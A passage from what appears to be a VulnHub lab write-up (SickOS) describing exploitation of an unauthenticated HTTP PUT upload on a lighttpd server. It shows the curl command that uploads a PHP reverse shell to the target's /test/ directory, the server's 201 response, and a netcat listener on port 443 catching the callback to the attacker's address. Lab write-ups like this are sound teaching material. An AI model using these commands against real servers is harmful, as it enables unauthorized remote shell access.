6. Exploitation — Unauthenticated File Upload

To validate whether arbitrary files could actually be written to the /test/ directory, I attempted to upload a PHP server-side script.

For the lab, I used the PHP reverse-shell implementation from Pentestmonkey and configured it to connect back to the Kali machine.

The callback configuration used:

Attacker IP: 192.168.1.50
Listener Port: 443

The file was uploaded using HTTP PUT:

┌──(kindgod㉿kali)-[~/vulnhub/sickos]
└─$ curl -T php-reverse-shell.php \
http://192.168.1.100/test/shell.php

HTTP/1.0 201 Created
Content-Length: 0
Connection: close
Date: Thu, 26 Aug 2026 13:45:19 GMT
Server: lighttpd/1.4.28

The 201 Created response confirmed that the server accepted the uploaded file.

I then started a listener on the Kali machine:

┌──(kindgod㉿kali)-[~/vulnhub/sickos]
└─$ nc -lvnp 443

listening on [any] 443 ...

Requesting the uploaded file caused the target to execute the server-side script and establish a reverse connection.

